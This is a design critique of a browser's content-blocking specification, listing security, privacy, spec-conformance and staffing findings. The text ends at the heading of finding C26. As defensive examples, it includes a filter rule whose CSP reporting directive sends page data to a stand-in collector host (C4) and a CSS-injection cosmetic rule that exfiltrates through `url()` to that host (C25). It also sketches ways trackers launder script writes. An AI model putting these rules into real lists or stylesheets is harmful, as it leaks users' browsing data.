# Izcal content blocking: design critique (phase 8)

Independent design critique of `reports/Izcal content blocking.md`, draft 0.1 (19 October 2026), under phase 8 of `.claude/skills/first-principles-spec/SKILL.md`. Compiled 19 October 2026 by a critic who did not write the spec. Checked against HGBA-2 2.3.2 (M-1, P1–P6, I-1, I-2), HGBA-3 (P2 scope note, B1, B9, B10, AG-0, PRIV-1, PRIV-2, DET-1), Stage 1 design (Section 1 process map, Section 6 rows, D-S1, D-S3, D-S8, D-S10, 13.1a, 13.2), networking 0.3.3 (6.1, 6.6–6.9, 6.13, 6.15–6.19, 6.21, NW-D3, NW-D7, NW-D16, NW-D17, NW-D18, NW-D26, NW-22, NW-36, NW-54, 9.3), style 0.3.3 (6.15 G24, 6.16, ST-D17), footprint 0.3 (6.11, 6.14, FP-28, FP-D7, FP-D9, FP-D16, FP-D18), JavaScript engine 0.3 (6.8–6.10, JS-D15), DevTools 0.3 (DT-1, DT-10), shell UI 4.3, GR-D12, TX-D4, MD-D14, LY-D11 (the layout, media and graphics specs were read as they stood, being edited concurrently), the Phase 2 reconciliation (P21, registry) and its licence audit (2.5, OD-L2, OD-L5, OD-L6), and the seven research notes.

Severity: **High** = contradicts an accepted spec or owner direction, or a stated security or privacy property does not hold; **Medium** = a gap that would change a design element, a target or the staffing; **Low** = wording, bookkeeping or a missing statement.

Section numbers without a prefix refer to the content-blocking spec. Quotes are verbatim.

---

## High

### C1. Two bounce-tracking policies for the same state; NW 6.9's rule is neither amended nor mentioned

**Problem.** The networking spec (accepted, 0.3.3) already defines a bounce-tracking mitigation with different scope and parameters. This spec defines a second one in a different process with different parameters and does not amend, replace or cite NW 6.9's rule. An implementer cannot satisfy both: NW 6.9 clears storage of any site never interacted with as top-level after 7 days (no bounce needed); CB-D8 deletes only sites that bounced and wrote state, after 1 h, with a 45-day interaction window.

**Evidence.**
- NW 6.9: "Bounce tracking: storage of a site the user never interacted with as a top-level site is cleared after 7 days†, the WebKit and Firefox class of mitigation".
- 6.5: "without user activation on that site in the last 45 days† (WebAuthn assertions count as activation) has its state in this container deleted after a 1 h† grace period."
- 9.5's only NW 6.9 row: "Cookie-lifetime cap for cloaked responses (CB-D9) and for writes attributed to restricted scripts (CB-D10)". Nothing on bounce tracking.
- Two further gaps in the same mechanism. (a) 6.5 says "The draft assumes third-party cookies are blocked; Izcal partitions them by default, so its precondition always holds." Partitioning is not blocking: NW 6.9 grants unpartitioned access through the Storage Access API, so for any site holding a grant the precondition fails, and the spec does not say what happens then. (b) The state to delete (localStorage, IndexedDB, Cache Storage, service-worker registrations) lives in the storage service and in partition services for T = the bouncer (NW 6.8 table), not in the container service; no endpoint or capability for `hg-nav-protect` to observe writes or order deletions there is specified. The 45-day interaction record is itself browsing history, and its holder, retention, clearing with history and private-window behaviour are not stated (FP-D18 is the model).

**Fix.** Add a 9.5 row amending NW 6.9: CB-D8 replaces the 7-day rule (or state both, with which one wins and why, and give each its own target). Mark it as an owner-visible row, because it changes accepted behaviour. In 6.5, specify: the behaviour for sites with a Storage Access grant under any top-level site in the container (exempt, as the precondition requires); the typed write notifications from the storage service and partition services, and the deletion capability the broker grants `hg-nav-protect` (IPC-R2 binding, scoped to the container); and the interaction store's holder (storage service), retention, clearing with history and site data, and memory-only behaviour in private windows, by reference to FP-D18.

### C2. List-scoped exceptions disable Izcal's own Exceptions list and login-flow entries, and contradict the claim about users' rules

**Problem.** Exceptions cancel blocks "only from its own list". Section 6.8 ships breakage exceptions and login-flow entries as a **separate list** ("Exceptions"). Under 6.2's semantics those entries cancel nothing in Tracking, Ads or Security, so every breakage fix and every login-flow exception is inoperative. The same rule makes the claim about the user's own rules false: the user's own rules are a list in 6.2's order, so a user's `@@` rule cannot cancel an Izcal block either; only a per-site override can. The per-site override itself unblocks "one entry", but one party's requests are often matched by several entries in several lists (Tracking and Ads, or Izcal and a user list), so the narrowest control often fails to fix the site.

**Evidence.**
- 6.2, Exceptions row: "**List-scoped**: an exception cancels only blocks from its own list (below)".
- 6.2, "Why list-scoped exceptions": "Izcal's own breakage exceptions are entries in Izcal's lists ... The cost: a user-added list written to correct another user-added list's over-blocking no longer can; the user's own rules and overrides still can."
- 6.2, precedence item 3: "Lists are ordered (the user's own rules, Izcal Security, Izcal Tracking, Izcal Ads, then user-added lists in the order added)".
- 6.8 list table: "**Exceptions** | Breakage exceptions and login-flow entries, each with its reason | On".
- 6.12: "**Allow one party here**: from the list of what was blocked, unblock one entry on this site."
- `badfilter`'s scope across lists is not stated either.

**Fix.** Define the scoping unit explicitly as a **trust domain**, not a list file: (i) Izcal's whole bundle is one domain, so an Izcal exception may cancel any Izcal block except Security entries, which only an exception carrying the same entry's ID can narrow; (ii) the user's own rules are a domain that may cancel blocks in every domain, including Izcal's (the user is the principal; G86 and CB-8 already treat explicit settings as allowed state), or else delete "the user's own rules ... still can"; (iii) each user-added or extension list is its own domain. State `badfilter` and `$document` scope by the same unit. Make "Allow one party here" act on a **party** (the host set of all entries that matched requests to that party on this site), not a single entry. Add CB-6 and CB-1 cases: an Izcal exception unblocks an Izcal Tracking entry; a user-added exception cannot unblock any Izcal entry; a user rule can.

### C3. The restrict action rests on an attribution rule the JavaScript spec does not define and that a tracker can bypass with one line; FP-D7 would also announce it

**Problem.** CB-D10 (starred) claims restricted scripts are kept from storing identifiers. Enforcement is "the script whose code ran the setter". JS 6.10 defines attribution of **time and allocation** per script, realm and origin; it defines no attribution of API calls, and no propagation rule for code a script creates. Any restricted script can launder its writes: insert an inline `<script>` element, call `eval`, `new Function` or `setTimeout` with a string, write through a same-origin `about:blank` iframe's `document.cookie`, or call a first-party helper (consent-manager libraries expose `setCookie(name, value)`). Each runs code that is not the restricted script's. The profile therefore binds only scripts that do not try to escape it, which is the opposite of the threat (TT 2 is about adversarial trackers). Separately, restricted scripts' CPU and wakeup caps reuse FP-D7, and FP-D7's action includes a page-visible report, which turns the cap into a detection signal. No JavaScript-spec amendment appears in 9.5 although the bindings and attribution work lands there.

**Evidence.**
- 6.4: "Attribution decides which script wrote: the engine's attributed script is the one whose code ran the setter."
- CB-D10's recommendation: "it keeps sites that depend on a tracker working without letting it keep identifiers".
- JS 6.10, "Time accounting": "Main-thread time per engine component ... and per script, realm and origin"; "Live allocation attribution: Per-allocation-site counters ... aggregated per script, realm and origin". No API-call attribution or creator propagation is defined.
- FP 6.14 (FP-D7): "**Reported and announced:** recorded in the intervention log, a Reporting API `intervention` report to the embedding site".
- 9.5 has rows for networking, style, footprint, Stage 1, HGBA-3, DevTools, shell, security scope and licence audit, and none for the JavaScript engine spec.

**Fix.** (1) Add a 9.5 row to the JavaScript engine spec: a defined **provenance rule for API calls** (the attributed script of the innermost non-builtin frame, and **creator inheritance**: code created by `eval`, `Function`, string timers, script-inserted inline scripts, `javascript:` URLs and same-origin child documents written by a restricted script inherits its restriction), stored outside the cage, with its cost inside JS-60's budget. (2) State the threat model honestly in 6.4 and CB-D10: helper-function laundering through first-party code is not closed by attribution, and the profile is a mitigation that raises cost, not a guarantee. (3) Add a target: an adversarial suite of laundering techniques against the cookie cap (0 bypasses for the creator-inheritance cases; the first-party-helper case reported, not hidden). (4) Decide whether a restricted script's CPU cap emits FP-D7's Reporting API report; recommend no report for restrict-profile caps (they are list policy, not an outlier intervention), and amend FP-D7 accordingly in the existing 9.5 footprint row.

### C4. `csp=` can name an external URL, which reopens the exfiltration path G81 and CB-D15 claim to close

**Problem.** A Content-Security-Policy can carry `report-uri <URL>`. A list rule `*$csp=script-src 'none'; report-uri https://collector.example/` would make every matching page send violation reports (document URL, blocked URL, referrer) to an address the list author chose. That defeats "No action can name an external URL", G81's verifier, CB-7's "only restrict" property test (a reporting directive restricts nothing) and, in Stage 2, the "zero read capability" of extension list providers.

**Evidence.**
- 6.2, Actions: "`csp=<policy>` (adds a policy, which can only restrict) ... No action can name an external URL, carry script text or remove a header".
- I10: "Policy text, parsed and checked to only restrict".
- G81: "No compiled rule or intervention can hold script text, a body rewrite, a header removal or an external URL".
- CB-D15 tier 1: "List providers, with **zero read capability** ... The extension receives no feedback about matches".

**Fix.** In the rule-syntax page and G81, accept `csp=` only as a parsed directive set from an allow-list of fetch and navigation directives (`script-src`, `img-src`, `frame-src`, `connect-src`, `object-src`, `worker-src`, `media-src`, `font-src`, `style-src`, `base-uri`, `form-action`, `upgrade-insecure-requests`, `block-all-mixed-content`), with source expressions limited to keywords and `'none'`; reject `report-uri`, `report-to`, any host-source and `require-trusted-types-for` (which breaks pages without restricting fetches). Same for `permissions=`: no `report-to`. Extend CB-5's planted suite and CB-7's property test with reporting directives, and add a CB-6 case that a list cannot cause any request to a host the page did not already request.

### C5. The transparency log as specified does not stop a targeted list, and CB-22 cannot detect one

**Problem.** The client "verifies inclusion" in a log that Izcal also operates. An operator (or anyone holding the signing keys) who serves a targeted bundle can show the targeted client a second log view in which that bundle is included (a split view). Inclusion proofs without consistency checks against a view other clients also see prove nothing about uniformity. CB-22's lab check from several regions cannot detect targeting by user, IP or time window, which is exactly the 2019 `$rewrite` attack the section cites. The verification step is also placed in the system service, while Stage 1's process map gives the update client to the broker; the spec does not say which process holds the TUF root and checks the log.

**Evidence.**
- 6.9: "Each bundle version's hash is also appended to a public **transparency log**, and the client verifies inclusion before use. A list operator who served a different list to chosen addresses ... would have to log it publicly."
- CB-22: "**1** bundle hash per version across all clients in a lab check from several regions".
- 6.0 diagram: "system service: fetch bundle, verify TUF + log inclusion". Stage 1 Section 1, Browser row: "... profile and policy, update client".

**Fix.** Specify a **witnessed** log: signed checkpoints cosigned by k-of-n independent witnesses whose keys ship in the TUF root, the client accepting a bundle only with a checkpoint carrying enough cosignatures and a consistency proof from its last accepted checkpoint, and published monitors that compare the log with the CDN's served bytes. Bind each diff's result hash, not only full bundles. Name the verifying process (the broker's update client, consistent with Stage 1, or the system service with the broker re-checking the result hash before handing the sealed source to the utility process). Restate CB-22 as: 100% of clients refuse a bundle without a witnessed, consistent checkpoint (tested with a planted split view); the lab check stays as a smoke test. Add the witness operators to Q-CB-4's relay-operator question and to the non-staff costs.

### C6. "Generation as a tool" for surrogates would derive shipped code from tracker library source (M-1)

**Problem.** SugarCoat generates replacements by rewriting the original third-party script (it takes the tracker's code as input). A surrogate produced that way is derived from the replaced library's source, which is not MIT and is often proprietary. The spec's own rule says surrogates are "never from the library's source", and the next sentence permits the generator that does exactly that.

**Evidence.**
- 6.6: "They are written by Izcal from the replaced library's **public documentation and black-box observation** ... never from the library's source ... SugarCoat showed replacements can be generated from a policy ([ME 4.9][ME]); Izcal may use generation as a tool, with the same review."
- ME 4.9 describes SugarCoat as generating "privacy-preserving replacement scripts" for scripts lists exempt; Section 7 part 3: "Surrogates are written from the replaced libraries' public documentation and black-box observation, never from their source."

**Fix.** Delete the generation allowance, or restrict it to generators whose only inputs are the library's public API documentation and black-box traces (recorded calls and return shapes observed from calling pages), with provenance recorded per surrogate and checked by G84-style tooling. Add a rule (G87) that `hg-cb-resources` has a provenance manifest per surrogate listing its inputs, and that no third-party script text is an input.

### C7. The Ads list admits entries on a footprint criterion alone, outside the P2 scope note's class (c)

**Problem.** HGBA-3's P2 scope note allows default-on interventions only in three classes; content blocking is class (c), "privacy protections on by default that carry a recorded P1 analysis". CB-D5 itself argues the Ads list must stay "a privacy and security list", then admits an entry on "a resource outlier" alone. Bytes and CPU are a footprint concern (FP-28), not P1. The reversal trigger tolerates up to half of the list being resource-only, which is a default-on intervention outside class (c) on its own spec's reasoning.

**Evidence.**
- HGBA-3 P2 scope note: "Interventions are permitted in three classes only: (a) ...; (b) overrides the user invokes explicitly ...; and (c) privacy protections on by default that carry a recorded P1 analysis ... An intervention outside these classes is a P2 violation."
- 6.8: "An ads-list entry therefore needs at least one of: the tracking criteria above; malvertising served on the crawl; a resource outlier above the 99.9th percentile of ad frames and scripts".
- CB-D5 reversal trigger: "Measured share of Ads entries carrying only the resource criterion above 50%†: review whether the list has become taste".

**Fix.** Either (a) drop the resource-only criterion from the default Ads list and handle resource outliers through FP-D7's intervention, which already exists for that purpose and is announced and explained; or (b) put resource-only entries in a separate list that is off by default (class (b), user-invoked); or (c) put to the owner an explicit amendment of the P2 scope note adding a footprint class, with its P1 analysis. Recommend (a). The reversal trigger becomes "any Ads entry whose only evidence is resource cost".

---

## Medium

### C8. FP-28 is silently changed from "per request" to "per request phase", and cold-start latency is not measured

**Problem.** FP-28 and NW 6.15 bound a request's match at p99 ≤ 20 µs. CB-18 bounds each of three phases (A, B, C) at 20 µs, so a request may take up to 60 µs and still pass. The 9.5 footprint row says "FP-28 per partition service" but not "per phase". The corpus request stream also hides the case that matters for a per-(T, C) design: a newly bound spare's first requests, which fault in pages of the mapped file (8–32 MiB) and the token index.

**Evidence.** FP-28: "p99 match ≤ 20 µs† per request". NW 6.15: "meets FP-28's p99 ≤ 20 µs†". CB-18: "p99 match time **≤ 20 µs†** per request phase".

**Fix.** Either keep "per request" (all phases summed) or add the change to 9.5's FP-28 and NW 6.15 rows with the reason. Add to CB-18 a cold-start case: p99 of the first 50 requests of a freshly bound partition service after the file has been evicted from the page cache, on DC-4. State whether the page-table cost of mapping the compiled file counts against the 256 KiB charged budget on each OS.

### C9. Sharing one compiled file across containers conflicts with FP-D16's partitioning rule; no amendment

**Problem.** FP-D16 makes compiled filter automata a member of the regenerable-cache class, whose rules include partitioning per (top-level site, container). This spec shares one file across every partition service of a container and across containers with the same list set. That may be fine (the file holds no user data), but it departs from an accepted decision and 9.5 does not amend FP-D16.

**Evidence.** FP-D16: "partitioned per (top-level site, container); members: ... compiled filter automata". 6.3: "one **sealed, position-independent file per distinct per-container list set** (two containers with the same set share it)".

**Fix.** Add a 9.5 row to FP-D16: compiled filter files are keyed by the hash of their source lists and compiler version, not by (T, C), because they hold no user- or site-derived state; files compiled from user-added lists are keyed per container (the list set is user state). Add a rule that nothing written by a partition service or renderer ever enters the file.

### C10. NW-54's metric and NW 6.15's tracking-list definition are changed without an amendment

**Problem.** NW-54 counts classifier-flagged third-party requests **blocked by the tracking list**. This spec deliberately does not block two classes the classifier will flag: bot-detection and anti-fraud scripts (published "not blocked") and restricted scripts (loaded under I5). NW 6.15 defines the tracking list to include "fingerprinting API use attributed to their scripts" and "known malware and cryptomining endpoints", whereas this spec moves the latter to Security and exempts bot-detection fingerprinting. CB-11 keeps "NW-54's ≥ 90%† of classifier-flagged third-party requests blocked" next to its own per-layer measure, so the two definitions coexist.

**Evidence.** NW-54: "on the crawl, ≥ 90%† of third-party requests the tracking classifier flags are blocked by the tracking list". 6.6: "**Bot-detection and anti-fraud scripts are a published category that is not blocked by default**". 9.5 NW 6.15 row mentions "the list set of Section 6.8" but not NW-54's denominator.

**Fix.** Amend NW-54 in 9.5: denominator excludes entries published in the Anti-fraud category and requests matched by a Restrict entry, which are reported separately; numerator is "prevented by layer N or D". Add the bot-detection exemption to the NW 6.15 row explicitly.

### C11. Debouncing turns trusted redirector hosts into open redirects and changes what the destination learns

**Problem.** Navigating straight to the decoded parameter skips everything the redirector would have done: signature checks on the destination (many redirectors refuse unsigned targets), interstitials for unknown destinations, and enterprise link-scanning services that rewrite links precisely so they can block phishing on click. A crafted link on a listed redirector host then goes anywhere without the redirector's checks while the user saw a familiar host. The destination also receives the **original page's** referrer instead of the redirector's, a privacy change the spec does not discuss.

**Evidence.** 6.5: "Izcal navigates straight to the destination: the parameter is decoded once, must be an `http` or `https` URL, and must not be another redirector entry."

**Fix.** Admit a redirector entry only when black-box evidence shows it redirects unconditionally to arbitrary parameter values (tested with random destinations on the crawl) and shows no interstitial; exclude a published category of security-scanning and signed redirectors; send the debounced navigation with `no-referrer` or with the redirector's origin as referrer; keep Safe-Browsing-class checks (Q-CB-5) on the destination. Add a CB-10 case for each.

### C12. Forced-redirect refusal departs from HTML navigation; its page-visible behaviour, WPT cost, trust boundary and P2 class are unstated

**Problem.** A non-sandboxed cross-origin iframe may navigate its top-level traversable under HTML's navigation rules; refusing it without transient activation is a deviation. The spec does not say what the initiating script observes (silent no-op, or an exception), which WPT tests change result, or how the broker knows about transient activation (the activation state lives in the subframe's renderer, which is the untrusted party asking to navigate). It calls the refusal class (c), a privacy protection, while its stated purpose is malvertising (security).

**Evidence.** 6.5: "A cross-origin subframe that navigates the top-level traversable without transient user activation is refused ... this is a class (c) intervention". I9: "Refuse a forced top-level redirect | Broker". Stage 1 Section 6 claims WPT neutrality only for cosmetic rules.

**Fix.** Add to 6.5: the observable outcome (recommend a silent no-op plus a console message, so pages cannot use the failure as a detector of anything beyond "Izcal"); the broker's own activation record, updated by input routing the broker performs, never by the renderer's claim; the P2 class with its P1 analysis (security under P1). Add a WPT target: every WPT result that changes with Izcal's default protections on versus off is listed and published per release, as the P2 scope note requires ("WPT and corpus breakage").

### C13. "User-origin hiding never changes fetches" is not implementable as described, and the scriptless framing overclaims

**Problem.** The fetches that hiding changes are CSS background images, lazy images and fonts. Whether a lazy image loads depends on layout (distance to the viewport), and hiding an element moves every later element, so "as if the rule did not apply" needs a counterfactual layout of the hidden subtree **and** of everything after it, not "a second evaluation of `display`". Font loads depend on which text is shaped. Separately, any page script can read the user-origin `display: none` through `getComputedStyle` or `offsetHeight`, so with script on, a user-added list's cosmetic rules are directly observable; fetch independence closes only scriptless probes.

**Evidence.** 6.7: "Fetch eligibility for images, backgrounds and fonts of an element hidden only by a user-origin hide rule is computed as if the rule did not apply; the cost is a second evaluation of `display` for those elements only." Section 3 table: "Filter-list fingerprinting ... **Uniform list sets**, side-channel-free hiding".

**Fix.** Narrow the claim to what is feasible: background images and fonts of hidden elements are fetched as if visible (style-only counterfactual); lazy images under or after hidden elements are a measured residual, like container queries; script-visible hiding is inherent and the defence for it is uniformity alone. Add each to the residual list in 6.16 and to CB-8's probe set. Ask the style and layout owners (9.5 rows) for the cost of the counterfactual, with a measurement milestone.

### C14. Breakage-report contents can re-identify; the recording option conflicts with DT-1(f); the relay hold departs from NW-D17's decided fallback

**Problem.** Paths carry capability tokens and identifiers (shared-document IDs, password-reset tokens, meeting IDs, user IDs in REST paths), so "path without query or fragment" can identify the user and grant access to their documents. The settings vector (overrides, list toggles, user-list presence) plus fired entries and time add bits. A recording of the failing load must start at process launch (DT-1(f)), so a report cannot attach a recording of the load the user just saw; the flow needs a reload in recording mode, which the spec does not describe. Finally, NW-D17 (owner-accepted) already decides what happens without a relay ("(b) with a published logging policy"); this spec instead holds reports until a relay exists, a departure not listed in 9.5.

**Evidence.** 6.11: "scheme, host and path, **without query or fragment**"; "the bundle version and an **enumerated settings vector**". DT-1(f): "**100%** of recordings start at process launch; no partial segment is ever kept". NW-D17 reversal: "No independent relay operator available: (b) with a published logging policy". 9.1: "Breakage reports through OHTTP wait for a relay operator (Q-NW-6) | ... | Security".

**Fix.** Default to scheme and host only; the path is a separate, previewed and editable field, with high-entropy segments (≥ 16 characters of mixed case and digits, or matching a token pattern) replaced by a placeholder before display. Coarsen the time to the day. Describe the recording flow as "reload this page in recording mode, then report". Either follow NW-D17's fallback or list the hold as an amendment to NW-D17 for the owner with its reason (an address on a report links a user's browsing to an identity; a logging policy is a promise, not a mechanism).

### C15. Placing debouncing and URL stripping in the container service widens the attack surface of the process that holds every first-party jar

**Problem.** The container service holds the container's unpartitioned first-party cookie jars for every site (NW-D3), so its compromise exposes every site's sessions in the container. This spec adds to it the processing of every navigation URL of the container (parameter stripping, decoding a redirector's destination parameter, which is attacker-chosen), timers and a per-site interaction store. That is the most valuable process taking new hostile-input work it does not need: the navigation request already passes through the target's partition service, which runs phase A on it.

**Evidence.** 6.5: "`hg-nav-protect`, which runs in the **container service** (it owns the container's first-party jars, NW-D3) and receives **typed navigation events** from the broker's navigation code". NW 6.19: "A compromise of a container service exposes that container's first-party jars and its DNS transport."

**Fix.** Split `hg-nav-protect`: stripping and debouncing run as a pure function over the sealed Parameters and Redirectors tables in the partition service that handles the navigation hop (it already parses the URL and maps the sealed file); only bounce bookkeeping (site IDs, timestamps, deletion orders, no URLs) runs in the container service. Add `hg-nav-protect`'s inputs to the compromised-service harness (NW-16).

### C16. User-added list fetches ignore the container's route and link a routed container to the user's real address

**Problem.** User-added lists are per container, but they are fetched by the system service, which follows the OS proxy configuration and never a container's route. A user who adds a list in a Tor- or WireGuard-routed container makes the list host see their real address at a schedule tied to that container's list set, linking the routed identity to the direct one; NW 6.8's rationale for R in every key is exactly this linkage.

**Evidence.** 6.9: "**User-added lists** are fetched by the system service from their URL at the same daily slot (NW-D17)". NW 6.13: "It follows the **OS proxy configuration** (and enterprise policy), never a container's route". NW 6.8: "a route change mid-session must not reuse state learned on the old route, or the user's real address would be linked to the proxied identity".

**Fix.** Fetch a user-added list for a routed container through that container's route (a fetch by the container's own services on the system schedule, with no cookies and no partition state), or fetch it once through the system service and share it only with containers on the direct route. State it in 6.9 and in the settings disclosure, and add it to the NW-D17 amendment row.

### C17. Determinism and update gaps: per-page version pinning, workers, security entries and user lists in recordings

**Problem.** (a) Pinning the bundle version for a page's lifetime means a long-lived tab (webmail, a dashboard open for weeks) never receives new security entries, and the "faster" security path cannot reach it. (b) A partition service serves many tabs of one site, so it must map several versions at once; the memory cost is not in CB-18. (c) Service workers and shared workers outlive pages; their version is not defined. (d) A recording records "the bundle version and compiled-file hash" only; for user-added lists the content is neither in the bundle nor recoverable later (the URL's content changes), so a replay cannot recompute decisions. (e) No target requires the compiler to produce byte-identical files from the same inputs, which replay-by-recompilation needs. (f) The fast security path rides "the update client's existing check" whose cadence is not stated.

**Evidence.** 6.14: "a top-level page keeps the bundle version it was loaded with for its lifetime"; "A recording records, as B1 inputs, the bundle version and compiled-file hash per container". 6.9: "Security entries that must reach users faster ride on the update client's existing check, never a new poll."

**Fix.** Allow additions from the Security list to apply mid-page as a recorded B1 input at a task boundary (the recording already records settings changes); everything else stays pinned. Define worker versions (the version current at the worker's start, re-pinned at each `fetch` event's client navigation). Bound concurrent versions per service (2) and count them in CB-18. Record user-added list sources (or the compiled file) in recordings, encrypted with the recording, and redact them from reports. Add a target: the compiler is a pure function (1,000 of 1,000 rebuilds byte-identical across the three OSes). State the security path's cadence and channel, and add it to NW-36's schedule.

### C18. Phase B is unavailable under proxy and remote-resolution routes, but CB-13 claims 100%

**Problem.** Under SOCKS remote resolution, HTTP proxies with CONNECT, the Tor route and some VPN clients, Izcal never sees the CNAME chain or addresses, and must not resolve locally (it would leak outside the route). The spec mentions only the OS-resolver fallback. CB-13 states 100% without scoping.

**Evidence.** 6.4: "under the OS-resolver fallback (NW 6.6) the chain is not visible, and the site panel's protection line says so." NW 6.13: "A routed container resolves **through its route** ... never the host resolver". CB-13: "**100%** of test zones with tracker CNAMEs at any hop ... are matched".

**Fix.** List every configuration where phase B is unavailable, state that Izcal does not resolve outside the route to recover it, show it in the site panel, and scope CB-13 to direct routes with Izcal's stub; report the unavailable share.

### C19. The protected-media host uses another engine's blocker, and its Windows path is unspecified

**Problem.** On macOS the host applies Izcal's rules through `WKContentRuleList`, which is WebKit's content-blocking compiler and matcher: a third-party blocking engine, excluded by the owner's direction unless classified as an OS interface. On Windows, 13.1a uses request interception in WebView2, where something must run the matcher on each intercepted request; the spec only exports Safari JSON, and does not say which process matches (the broker may not parse web data, IPC-R15).

**Evidence.** 6.18: "The **protected-media host** (D-S7, Stage 1 13.1a) blocks through its host's own rule API, fed by `hg-cb-export`". Stage 1 13.1a: "content blocking through request interception or `WKContentRuleList`".

**Fix.** Classify `WKContentRuleList` explicitly in Section 7 as an OS interface (class 5 of the licence audit), used because the host is the OS's engine, with the label already in 13.1a; put that classification to the owner as a row. For Windows, route WebView2 interception callbacks to a partition service for the page's (T, C) running `hg-content-block` (not the broker), and state the latency cost. Add the protected-media case to CB-6 (the host's rule subset cannot express `restrict`, phase B or `removeparam` on all channels; publish what is lost).

### C20. The coverage job makes third-party lists a de facto candidate source for curators

**Problem.** G84 allows third-party lists in a coverage job "marked test-only". If curators see which hosts EasyList or uBO block and Izcal does not, those hosts become the crawl's next candidates and the entries derive from the third-party lists' selection, which G84, NW 6.15 ("never as a source of entries") and the owner's direction forbid. Nothing in 6.8 or G84 separates coverage results from the review queue.

**Evidence.** 6.8: "**Lab use of third-party lists** is test-only (OD-L2) and limited to coverage measurement ... No third-party list is ever an input to Izcal's entries (G84)." G84: "except the coverage job, marked test-only".

**Fix.** Add to G84: coverage results are published only as aggregates (share of requests and categories), never as host or rule lists, and are not readable by `hg-list-build`'s candidate and review components (enforced by tool permissions and recorded provenance); candidates come only from the crawl's own heuristics and from user reports. Add a CB-21 check that no entry's first-seen evidence predates its first crawl observation.

### C21. Staffing: second reviewer not costed, person-year arithmetic wrong, importers assigned twice, items missing

**Problem.** (a) The two-person review is new work, but the total keeps NW's 3–6† lists share unchanged and defers the effect to CB-M2; the total is therefore understated by construction. (b) "16–30† person-years to Stage 1 exit" cannot follow from 4–7† people over 36–48 months with a ramp: the maximum at full strength from day one is 4 × 3 = 12 to 7 × 4 = 28, and a ramp lowers both. (c) The format importers are in this spec's surrogates row and also moved into NW's content-blocking track by a 9.5 row. (d) Missing: transparency-log operation and witness coordination, the entity-data pipeline (RDAP, certificates, corporate records), crawler operations in several regions beyond NW's lists track, and the legal opinions' coordination (partly in governance).

**Evidence.** 9.3: "The two-person review (CB-D16) and the appeals process may push the lists track toward the top of NW's 3–6†"; "about 4–7† a year once staffed, about 16–30† to Stage 1 exit with a ramp"; surrogates row: "the format importers (DNR and Safari JSON) and `hg-cb-export`"; 9.5 NW 9.3 row: "The content-blocking track's scope includes the format importers".

**Fix.** Derive the review load: expected new and changed entries per week (from the crawl's candidate rate, estimated at CB-M0) × 2 reviews × minutes per review, plus re-validation of all entries every 12 weeks†, and add the second reviewer's share to this spec's table. Recompute person-years with the ramp shown. Put the importers in one place. Add rows for log and entity-data operations (or state they are inside a named row).

### C22. Several targets are not falsifiable or measure the lists with the tool that made them

**Problem.** CB-11 and CB-12 measure coverage with the same heuristics and classifier that propose entries, so a blind spot in the classifier is invisible to the target. CB-8's user-list case has no threshold, and "distinguish **no** subgroup" has no statistical test or sample size. CB-20 has no threshold for the comprehension study. CB-17 is a Stage 1 target fed by Stage 2's banner rules. CB-25's "0 entries ... with any payment" has no method.

**Evidence.** CB-11: "third-party identifier flows (Section 6.8's criteria)"; CB-12: "scripts the lab's behaviour classifier flags as fingerprinting"; CB-8: "the residual bits are measured and shown"; CB-20: "a comprehension study of the panel's wording before Stage 1 exit"; CB-17: "(from Stage 2's banner rules)".

**Fix.** Give CB-11 and CB-12 an independent oracle: a hand-labelled held-out set of sites (labelled by people who do not curate) plus published research tools' detections run black-box, with agreement reported. Give CB-8 a test (for example, a classifier over probe results cannot separate two default profiles above chance at α = 0.01 over N† ≥ 1,000 runs) and a user-list threshold that triggers the settings warning wording. Give CB-20 a threshold (≥ 80%† of participants answer the two comprehension questions correctly). Move CB-17 to Stage 2 or scope it to Izcal's per-site hide rules. Give CB-25 a method (signed annual attestation by staff and funders plus an external review of exceptions).

### C23. The 256 KiB cosmetic budget may refuse the most common user list outright

**Problem.** User lists' generic cosmetic rules go to every site process as a generic subset inside the ≤ 256 KiB† sheet, and a list that exceeds a budget is "refused, not truncated". EasyList's generic hiding section alone is plausibly near or above that size, so adding EasyList (the case CB-D14 cites as how users judge a blocker) could be refused. No measurement of the common lists against the budget is planned before the budget is fixed.

**Evidence.** 6.7: "User-added lists' cosmetic rules compile into per-site subsets and a generic subset, delivered to each site process as one user-origin sheet ≤ 256 KiB†". 6.3: "A hostile list that would exceed a budget is refused, not truncated".

**Fix.** Measure the generic subsets of the four common lists in the CB-M0 coverage job and set the budget from that. Index generic rules by the id and class they require (the style engine's rule hash already does this), deliver them as one shared, mapped, read-only sheet charged once rather than per site, and make the refusal message say which budget and by how much.

### C24. Staging the whole Ads list behind one criterion's calibration is broader than the measurement requires

**Problem.** Only the resource-outlier criterion needs FP-D7's calibration corpus. Ads entries that qualify by tracking, malvertising or identifier receipt need no calibration, yet the whole list waits until CB-M4. The owner's direction allows staging only for correctness, security or measurement, and only the measured part needs to wait. (If C7's fix (a) is taken, the criterion disappears and so does the hold.)

**Evidence.** 9.1: "The Ads list ships after Tracking and Security | Its resource-outlier criterion needs FP-D7's calibration corpus (FP-M5) | Measurement".

**Fix.** Ship Ads entries with non-resource evidence with the first lists (CB-M3); hold only entries whose sole evidence is resource cost, or remove them (C7).

### C25. Cosmetic rules must be compiled from parsed selectors with a fixed declaration; G80's wording conflicts with P21

**Problem.** A cosmetic rule's text such as `##div{}a{background:url(https://collector.example/?x)}` injects arbitrary CSS if the compiler concatenates the selector text into a sheet. With attribute selectors and `url()`, injected CSS can exfiltrate page content (a known CSS-exfiltration technique). The spec says selectors are parsed by `hg-css-syntax`, but not that the emitted sheet contains only re-serialized selectors with `display: none !important`. Separately, G80 says renderers "receive only sealed files", while P21 and ST 6.16 have the renderer parse the subset as CSS text.

**Evidence.** 6.7: "Selectors are Selectors 4 as `hg-css-syntax` parses them". G80: "the broker, network services and renderers receive only sealed files". Reconciliation P21: "ST parses and applies them as user-origin sheets".

**Fix.** State in 6.7 and G81: a cosmetic rule compiles to (selector AST, fixed action); the subset is produced by Izcal's serializer from the AST; `hg-cb-format`'s verifier rejects any subset whose re-parse yields a declaration other than `display: none !important` or any token outside selectors. Reword G80: renderers receive the sealed subset and parse only the serialized CSS that the verifier accepted. Add a CB-5 planted case for CSS injection.

### C26. Paint-only suppression leaves invisible click targets, splits sighted and assistive users, and belongs to the graphics spec

